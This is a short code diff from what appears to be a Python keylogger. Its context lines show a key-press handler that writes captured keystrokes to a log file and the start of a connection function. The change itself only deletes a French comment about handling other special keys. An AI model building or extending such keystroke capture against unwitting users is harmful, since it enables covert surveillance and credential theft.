@@ -40,7 +40,6 @@ def on_press(key):
             logfile.write(' ')
         elif key == Key.enter:
             logfile.write('\n')
-        # else: Ajouter ici d'autres cas pour les touches spéciales
 
 def establish_connection():
     start_time = time.time()
